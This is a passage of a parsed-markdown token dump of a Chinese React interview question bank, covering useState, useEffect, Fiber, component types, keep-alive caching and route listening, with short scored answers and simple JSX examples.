类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- useState 是一个 Hook，用于在函数组件中添加状态。\\n\\n- 主要特点：\\n\\n- 初始化状态：第一次调用 useState 时，传入的初始值会被用作初始状态。\\n\\n- 更新状态：返回一个数组，第一个元素是当前状态，第二个元素是一个用于更新状态的函数。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- useState 是一个 Hook，用于在函数组件中添加状态。\\n\\n","task":false,"loose":true,"text":"useState 是一个 Hook，用于在函数组件中添加状态。\\n","tokens":[{"type":"text","raw":"useState 是一个 Hook，用于在函数组件中添加状态。\\n","text":"useState 是一个 Hook，用于在函数组件中添加状态。","tokens":[{"type":"text","raw":"useState 是一个 Hook，用于在函数组件中添加状态。","text":"useState 是一个 Hook，用于在函数组件中添加状态。","escaped":false}]}]},{"type":"list_item","raw":"- 主要特点：\\n\\n","task":false,"loose":true,"text":"主要特点：\\n","tokens":[{"type":"text","raw":"主要特点：\\n","text":"主要特点：","tokens":[{"type":"text","raw":"主要特点：","text":"主要特点：","escaped":false}]}]},{"type":"list_item","raw":"- 初始化状态：第一次调用 useState 时，传入的初始值会被用作初始状态。\\n\\n","task":false,"loose":true,"text":"初始化状态：第一次调用 useState 时，传入的初始值会被用作初始状态。\\n","tokens":[{"type":"text","raw":"初始化状态：第一次调用 useState 时，传入的初始值会被用作初始状态。\\n","text":"初始化状态：第一次调用 useState 时，传入的初始值会被用作初始状态。","tokens":[{"type":"text","raw":"初始化状态：第一次调用 useState 时，传入的初始值会被用作初始状态。","text":"初始化状态：第一次调用 useState 时，传入的初始值会被用作初始状态。","escaped":false}]}]},{"type":"list_item","raw":"- 更新状态：返回一个数组，第一个元素是当前状态，第二个元素是一个用于更新状态的函数。","task":false,"loose":true,"text":"更新状态：返回一个数组，第一个元素是当前状态，第二个元素是一个用于更新状态的函数。","tokens":[{"type":"text","raw":"更新状态：返回一个数组，第一个元素是当前状态，第二个元素是一个用于更新状态的函数。","text":"更新状态：返回一个数组，第一个元素是当前状态，第二个元素是一个用于更新状态的函数。","tokens":[{"type":"text","raw":"更新状态：返回一个数组，第一个元素是当前状态，第二个元素是一个用于更新状态的函数。","text":"更新状态：返回一个数组，第一个元素是当前状态，第二个元素是一个用于更新状态的函数。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```JSX\\nimport React, { useState } from \'react\';\\n\\nconst Counter = () => {\\n  const [count, setCount] = useState(0);\\n\\n  const increment = () => {\\n    setCount(count + 1);\\n  };\\n\\n  const decrement = () => {\\n    setCount(count - 1);\\n  };\\n\\n  return (\\n    <div>\\n      <h1>Count: {count}</h1>\\n      <button onClick={increment}>Increment</button>\\n      <button onClick={decrement}>Decrement</button>\\n    </div>\\n  );\\n};\\n\\nexport default Counter;\\n\\n```","lang":"JSX","text":"import React, { useState } from \'react\';\\n\\nconst Counter = () => {\\n  const [count, setCount] = useState(0);\\n\\n  const increment = () => {\\n    setCount(count + 1);\\n  };\\n\\n  const decrement = () => {\\n    setCount(count - 1);\\n  };\\n\\n  return (\\n    <div>\\n      <h1>Count: {count}</h1>\\n      <button onClick={increment}>Increment</button>\\n      <button onClick={decrement}>Decrement</button>\\n    </div>\\n  );\\n};\\n\\nexport default Counter;\\n"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 21. 什么是 useEffect？它如何工作？\\n\\n","depth":2,"text":"21. 什么是 useEffect？它如何工作？","tokens":[{"type":"text","raw":"21. 什么是 useEffect？它如何工作？","text":"21. 什么是 useEffect？它如何工作？","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- useEffect 是一个 Hook，用于在函数组件中执行副作用操作，如数据获取、订阅或手动更改 DOM。\\n\\n- 工作原理：\\n\\n- 执行副作用：在组件挂载和更新时执行副作用操作。\\n\\n- 清理副作用：返回一个可选的清理函数，用于在组件卸载或下次执行副作用前清理上一次的副作用。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- useEffect 是一个 Hook，用于在函数组件中执行副作用操作，如数据获取、订阅或手动更改 DOM。\\n\\n","task":false,"loose":true,"text":"useEffect 是一个 Hook，用于在函数组件中执行副作用操作，如数据获取、订阅或手动更改 DOM。\\n","tokens":[{"type":"text","raw":"useEffect 是一个 Hook，用于在函数组件中执行副作用操作，如数据获取、订阅或手动更改 DOM。\\n","text":"useEffect 是一个 Hook，用于在函数组件中执行副作用操作，如数据获取、订阅或手动更改 DOM。","tokens":[{"type":"text","raw":"useEffect 是一个 Hook，用于在函数组件中执行副作用操作，如数据获取、订阅或手动更改 DOM。","text":"useEffect 是一个 Hook，用于在函数组件中执行副作用操作，如数据获取、订阅或手动更改 DOM。","escaped":false}]}]},{"type":"list_item","raw":"- 工作原理：\\n\\n","task":false,"loose":true,"text":"工作原理：\\n","tokens":[{"type":"text","raw":"工作原理：\\n","text":"工作原理：","tokens":[{"type":"text","raw":"工作原理：","text":"工作原理：","escaped":false}]}]},{"type":"list_item","raw":"- 执行副作用：在组件挂载和更新时执行副作用操作。\\n\\n","task":false,"loose":true,"text":"执行副作用：在组件挂载和更新时执行副作用操作。\\n","tokens":[{"type":"text","raw":"执行副作用：在组件挂载和更新时执行副作用操作。\\n","text":"执行副作用：在组件挂载和更新时执行副作用操作。","tokens":[{"type":"text","raw":"执行副作用：在组件挂载和更新时执行副作用操作。","text":"执行副作用：在组件挂载和更新时执行副作用操作。","escaped":false}]}]},{"type":"list_item","raw":"- 清理副作用：返回一个可选的清理函数，用于在组件卸载或下次执行副作用前清理上一次的副作用。","task":false,"loose":true,"text":"清理副作用：返回一个可选的清理函数，用于在组件卸载或下次执行副作用前清理上一次的副作用。","tokens":[{"type":"text","raw":"清理副作用：返回一个可选的清理函数，用于在组件卸载或下次执行副作用前清理上一次的副作用。","text":"清理副作用：返回一个可选的清理函数，用于在组件卸载或下次执行副作用前清理上一次的副作用。","tokens":[{"type":"text","raw":"清理副作用：返回一个可选的清理函数，用于在组件卸载或下次执行副作用前清理上一次的副作用。","text":"清理副作用：返回一个可选的清理函数，用于在组件卸载或下次执行副作用前清理上一次的副作用。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```JSX\\nimport React, { useState, useEffect } from \'react\';\\n\\nconst DataFetcher = () => {\\n  const [data, setData] = useState(null);\\n\\n  useEffect(() => {\\n    const fetchData = async () => {\\n      const response = await fetch(\'/api/data\');\\n      const json = await response.json();\\n      setData(json);\\n    };\\n\\n    fetchData();\\n\\n    // 清理函数\\n    return () => {\\n      console.log(\'Cleanup\');\\n    };\\n  }, []); // 依赖数组为空，表示仅在组件挂载时执行\\n\\n  return (\\n    <div>\\n      {data ? <pre>{JSON.stringify(data, null, 2)}</pre> : <p>Loading...</p>}\\n    </div>\\n  );\\n};\\n\\nexport default DataFetcher;\\n\\n```","lang":"JSX","text":"import React, { useState, useEffect } from \'react\';\\n\\nconst DataFetcher = () => {\\n  const [data, setData] = useState(null);\\n\\n  useEffect(() => {\\n    const fetchData = async () => {\\n      const response = await fetch(\'/api/data\');\\n      const json = await response.json();\\n      setData(json);\\n    };\\n\\n    fetchData();\\n\\n    // 清理函数\\n    return () => {\\n      console.log(\'Cleanup\');\\n    };\\n  }, []); // 依赖数组为空，表示仅在组件挂载时执行\\n\\n  return (\\n    <div>\\n      {data ? <pre>{JSON.stringify(data, null, 2)}</pre> : <p>Loading...</p>}\\n    </div>\\n  );\\n};\\n\\nexport default DataFetcher;\\n"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 22. 在 React 组件中，useEffect 钩子的第二个参数（依赖项数组）为空数组和不设置有什么区别？\\n\\n","depth":2,"text":"22. 在 React 组件中，useEffect 钩子的第二个参数（依赖项数组）为空数组和不设置有什么区别？","tokens":[{"type":"text","raw":"22. 在 React 组件中，useEffect 钩子的第二个参数（依赖项数组）为空数组和不设置有什么区别？","text":"22. 在 React 组件中，useEffect 钩子的第二个参数（依赖项数组）为空数组和不设置有什么区别？","escaped":false}]},{"type":"heading","raw":"#### 类型：基础\\n\\n","depth":4,"text":"类型：基础","tokens":[{"type":"text","raw":"类型：基础","text":"类型：基础","escaped":false}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：** 为空数组时，useEffect 仅在组件挂载和卸载时执行一次，类似 componentDidMount 与 componentWillUnmount 的结合；不设置时，每次组件渲染\\n后 useEffect 都会执行，可能导致不必要的副作用反复运行。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 为空数组时，useEffect 仅在组件挂载和卸载时执行一次，类似 componentDidMount 与 componentWillUnmount 的结合；不设置时，每次组件渲染\\n后 useEffect 都会执行，可能导致不必要的副作用反复运行。","task":false,"loose":false,"text":"**1：** 为空数组时，useEffect 仅在组件挂载和卸载时执行一次，类似 componentDidMount 与 componentWillUnmount 的结合；不设置时，每次组件渲染\\n后 useEffect 都会执行，可能导致不必要的副作用反复运行。","tokens":[{"type":"text","raw":"**1：** 为空数组时，useEffect 仅在组件挂载和卸载时执行一次，类似 componentDidMount 与 componentWillUnmount 的结合；不设置时，每次组件渲染\\n\\n后 useEffect 都会执行，可能导致不必要的副作用反复运行。","text":"**1：** 为空数组时，useEffect 仅在组件挂载和卸载时执行一次，类似 componentDidMount 与 componentWillUnmount 的结合；不设置时，每次组件渲染\\n后 useEffect 都会执行，可能导致不必要的副作用反复运行。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 为空数组时，useEffect 仅在组件挂载和卸载时执行一次，类似 componentDidMount 与 componentWillUnmount 的结合；不设置时，每次组件渲染\\n后 useEffect 都会执行，可能导致不必要的副作用反复运行。","text":" 为空数组时，useEffect 仅在组件挂载和卸载时执行一次，类似 componentDidMount 与 componentWillUnmount 的结合；不设置时，每次组件渲染\\n后 useEffect 都会执行，可能导致不必要的副作用反复运行。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 23. 说说对Fiber架构的理解？解决了什么问题？\\n\\n","depth":2,"text":"23. 说说对Fiber架构的理解？解决了什么问题？","tokens":[{"type":"text","raw":"23. 说说对Fiber架构的理解？解决了什么问题？","text":"23. 说说对Fiber架构的理解？解决了什么问题？","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"paragraph","raw":"在react中，主要做了以下的操作：","text":"在react中，主要做了以下的操作：","tokens":[{"type":"text","raw":"在react中，主要做了以下的操作：","text":"在react中，主要做了以下的操作：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** 为每个增加了优先级，优先级高的任务可以中断低优先级的任务。然后再重新，注意是重新执行优先级低的任务\\n- **1：** 增加了异步任务，调用requestIdleCallback api，浏览器空闲的时候执行\\n- **1：** dom diff树变成了链表，一个dom对应两个fiber（一个链表），对应两个队列，这都是为找到被中断的任务，重新执行\\n- **1：** Fiber把渲染更新过程拆分成多个子任务，每次只做一小部分，做完看是否还有剩余时间，如果有继续下一个任务；如果没有，挂起当前任务，将时间控制权交给主线程，等主线程不忙的时候在继续执行，即可以中断与恢复，恢复后也可以复用之前的中间状态，并给不同的任务赋予不同的优先级，其中每个任务更新单元为 React Element 对应的 Fiber节点","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 为每个增加了优先级，优先级高的任务可以中断低优先级的任务。然后再重新，注意是重新执行优先级低的任务\\n","task":false,"loose":false,"text":"**1：** 为每个增加了优先级，优先级高的任务可以中断低优先级的任务。然后再重新，注意是重新执行优先级低的任务","tokens":[{"type":"text","raw":"**1：** 为每个增加了优先级，优先级高的任务可以中断低优先级的任务。然后再重新，注意是重新执行优先级低的任务","text":"**1：** 为每个增加了优先级，优先级高的任务可以中断低优先级的任务。然后再重新，注意是重新执行优先级低的任务","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 为每个增加了优先级，优先级高的任务可以中断低优先级的任务。然后再重新，注意是重新执行优先级低的任务","text":" 为每个增加了优先级，优先级高的任务可以中断低优先级的任务。然后再重新，注意是重新执行优先级低的任务","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 增加了异步任务，调用requestIdleCallback api，浏览器空闲的时候执行\\n","task":false,"loose":false,"text":"**1：** 增加了异步任务，调用requestIdleCallback api，浏览器空闲的时候执行","tokens":[{"type":"text","raw":"**1：** 增加了异步任务，调用requestIdleCallback api，浏览器空闲的时候执行","text":"**1：** 增加了异步任务，调用requestIdleCallback api，浏览器空闲的时候执行","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 增加了异步任务，调用requestIdleCallback api，浏览器空闲的时候执行","text":" 增加了异步任务，调用requestIdleCallback api，浏览器空闲的时候执行","escaped":false}]}]},{"type":"list_item","raw":"- **1：** dom diff树变成了链表，一个dom对应两个fiber（一个链表），对应两个队列，这都是为找到被中断的任务，重新执行\\n","task":false,"loose":false,"text":"**1：** dom diff树变成了链表，一个dom对应两个fiber（一个链表），对应两个队列，这都是为找到被中断的任务，重新执行","tokens":[{"type":"text","raw":"**1：** dom diff树变成了链表，一个dom对应两个fiber（一个链表），对应两个队列，这都是为找到被中断的任务，重新执行","text":"**1：** dom diff树变成了链表，一个dom对应两个fiber（一个链表），对应两个队列，这都是为找到被中断的任务，重新执行","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" dom diff树变成了链表，一个dom对应两个fiber（一个链表），对应两个队列，这都是为找到被中断的任务，重新执行","text":" dom diff树变成了链表，一个dom对应两个fiber（一个链表），对应两个队列，这都是为找到被中断的任务，重新执行","escaped":false}]}]},{"type":"list_item","raw":"- **1：** Fiber把渲染更新过程拆分成多个子任务，每次只做一小部分，做完看是否还有剩余时间，如果有继续下一个任务；如果没有，挂起当前任务，将时间控制权交给主线程，等主线程不忙的时候在继续执行，即可以中断与恢复，恢复后也可以复用之前的中间状态，并给不同的任务赋予不同的优先级，其中每个任务更新单元为 React Element 对应的 Fiber节点","task":false,"loose":false,"text":"**1：** Fiber把渲染更新过程拆分成多个子任务，每次只做一小部分，做完看是否还有剩余时间，如果有继续下一个任务；如果没有，挂起当前任务，将时间控制权交给主线程，等主线程不忙的时候在继续执行，即可以中断与恢复，恢复后也可以复用之前的中间状态，并给不同的任务赋予不同的优先级，其中每个任务更新单元为 React Element 对应的 Fiber节点","tokens":[{"type":"text","raw":"**1：** Fiber把渲染更新过程拆分成多个子任务，每次只做一小部分，做完看是否还有剩余时间，如果有继续下一个任务；如果没有，挂起当前任务，将时间控制权交给主线程，等主线程不忙的时候在继续执行，即可以中断与恢复，恢复后也可以复用之前的中间状态，并给不同的任务赋予不同的优先级，其中每个任务更新单元为 React Element 对应的 Fiber节点","text":"**1：** Fiber把渲染更新过程拆分成多个子任务，每次只做一小部分，做完看是否还有剩余时间，如果有继续下一个任务；如果没有，挂起当前任务，将时间控制权交给主线程，等主线程不忙的时候在继续执行，即可以中断与恢复，恢复后也可以复用之前的中间状态，并给不同的任务赋予不同的优先级，其中每个任务更新单元为 React Element 对应的 Fiber节点","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Fiber把渲染更新过程拆分成多个子任务，每次只做一小部分，做完看是否还有剩余时间，如果有继续下一个任务；如果没有，挂起当前任务，将时间控制权交给主线程，等主线程不忙的时候在继续执行，即可以中断与恢复，恢复后也可以复用之前的中间状态，并给不同的任务赋予不同的优先级，其中每个任务更新单元为 React Element 对应的 Fiber节点","text":" Fiber把渲染更新过程拆分成多个子任务，每次只做一小部分，做完看是否还有剩余时间，如果有继续下一个任务；如果没有，挂起当前任务，将时间控制权交给主线程，等主线程不忙的时候在继续执行，即可以中断与恢复，恢复后也可以复用之前的中间状态，并给不同的任务赋予不同的优先级，其中每个任务更新单元为 React Element 对应的 Fiber节点","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 24. react无状态组件和class类组件的区别？\\n\\n","depth":2,"text":"24. react无状态组件和class类组件的区别？","tokens":[{"type":"text","raw":"24. react无状态组件和class类组件的区别？","text":"24. react无状态组件和class类组件的区别？","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- 直观区别，函数组件代码量较少，相比类组件更加简洁\\n\\n- 函数组件看似只是一个返回react元素的函数，其实体现的是无状态组件的思想，函数组件中没有this， 没有state，也没有生命周期，这就决定了函数组件都是展示性组件，接收props，渲染dom，而不关注其他逻辑\\n\\n- 因为函数组件不需要考虑组件状态和组件生命周期方法中的各种比较校验，所以有很大的性能提升空间","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 直观区别，函数组件代码量较少，相比类组件更加简洁\\n\\n","task":false,"loose":true,"text":"直观区别，函数组件代码量较少，相比类组件更加简洁\\n","tokens":[{"type":"text","raw":"直观区别，函数组件代码量较少，相比类组件更加简洁\\n","text":"直观区别，函数组件代码量较少，相比类组件更加简洁","tokens":[{"type":"text","raw":"直观区别，函数组件代码量较少，相比类组件更加简洁","text":"直观区别，函数组件代码量较少，相比类组件更加简洁","escaped":false}]}]},{"type":"list_item","raw":"- 函数组件看似只是一个返回react元素的函数，其实体现的是无状态组件的思想，函数组件中没有this， 没有state，也没有生命周期，这就决定了函数组件都是展示性组件，接收props，渲染dom，而不关注其他逻辑\\n\\n","task":false,"loose":true,"text":"函数组件看似只是一个返回react元素的函数，其实体现的是无状态组件的思想，函数组件中没有this， 没有state，也没有生命周期，这就决定了函数组件都是展示性组件，接收props，渲染dom，而不关注其他逻辑\\n","tokens":[{"type":"text","raw":"函数组件看似只是一个返回react元素的函数，其实体现的是无状态组件的思想，函数组件中没有this， 没有state，也没有生命周期，这就决定了函数组件都是展示性组件，接收props，渲染dom，而不关注其他逻辑\\n","text":"函数组件看似只是一个返回react元素的函数，其实体现的是无状态组件的思想，函数组件中没有this， 没有state，也没有生命周期，这就决定了函数组件都是展示性组件，接收props，渲染dom，而不关注其他逻辑","tokens":[{"type":"text","raw":"函数组件看似只是一个返回react元素的函数，其实体现的是无状态组件的思想，函数组件中没有this， 没有state，也没有生命周期，这就决定了函数组件都是展示性组件，接收props，渲染dom，而不关注其他逻辑","text":"函数组件看似只是一个返回react元素的函数，其实体现的是无状态组件的思想，函数组件中没有this， 没有state，也没有生命周期，这就决定了函数组件都是展示性组件，接收props，渲染dom，而不关注其他逻辑","escaped":false}]}]},{"type":"list_item","raw":"- 因为函数组件不需要考虑组件状态和组件生命周期方法中的各种比较校验，所以有很大的性能提升空间","task":false,"loose":true,"text":"因为函数组件不需要考虑组件状态和组件生命周期方法中的各种比较校验，所以有很大的性能提升空间","tokens":[{"type":"text","raw":"因为函数组件不需要考虑组件状态和组件生命周期方法中的各种比较校验，所以有很大的性能提升空间","text":"因为函数组件不需要考虑组件状态和组件生命周期方法中的各种比较校验，所以有很大的性能提升空间","tokens":[{"type":"text","raw":"因为函数组件不需要考虑组件状态和组件生命周期方法中的各种比较校验，所以有很大的性能提升空间","text":"因为函数组件不需要考虑组件状态和组件生命周期方法中的各种比较校验，所以有很大的性能提升空间","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 25. react如何做到和vue中keep-alive的缓存效果\\n\\n","depth":2,"text":"25. react如何做到和vue中keep-alive的缓存效果","tokens":[{"type":"text","raw":"25. react如何做到和vue中keep-alive的缓存效果","text":"25. react如何做到和vue中keep-alive的缓存效果","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- React Keep Alive 提供了 ，必须把 放在 Provider 里面，并且每个 组件都必须拥有一个唯一的 key","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- React Keep Alive 提供了 ，必须把 放在 Provider 里面，并且每个 组件都必须拥有一个唯一的 key","task":false,"loose":false,"text":"React Keep Alive 提供了 ，必须把 放在 Provider 里面，并且每个 组件都必须拥有一个唯一的 key","tokens":[{"type":"text","raw":"React Keep Alive 提供了 ，必须把 放在 Provider 里面，并且每个 组件都必须拥有一个唯一的 key","text":"React Keep Alive 提供了 ，必须把 放在 Provider 里面，并且每个 组件都必须拥有一个唯一的 key","tokens":[{"type":"text","raw":"React Keep Alive 提供了 ，必须把 放在 Provider 里面，并且每个 组件都必须拥有一个唯一的 key","text":"React Keep Alive 提供了 ，必须把 放在 Provider 里面，并且每个 组件都必须拥有一个唯一的 key","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 26. React如何做路由监听\\n\\n","depth":2,"text":"26. React如何做路由监听","tokens":[{"type":"text","raw":"26. React如何做路由监听","text":"26. React如何做路由监听","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"code","raw":"``` react\\n\\ncomponentDidMount(){ this.context.router.history.listen((route)=>{ if(route.pathname===\'/xxx\'){ console.log(1); } }); } \\n\\n```","lang":"react","text":"\\ncomponentDidMount(){ this.context.router.history.listen((route)=>{ if(route.pathname===\'/xxx\'){ console.log(1); } }); } \\n"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 27. React 中 keys 的作用是什么？\\n\\n","depth":2,"text":"27. React 中 keys 的作用是什么？","tokens":[{"type":"text","raw":"27. React 中 keys 的作用是什么？","text":"27. React 中 keys 的作用是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 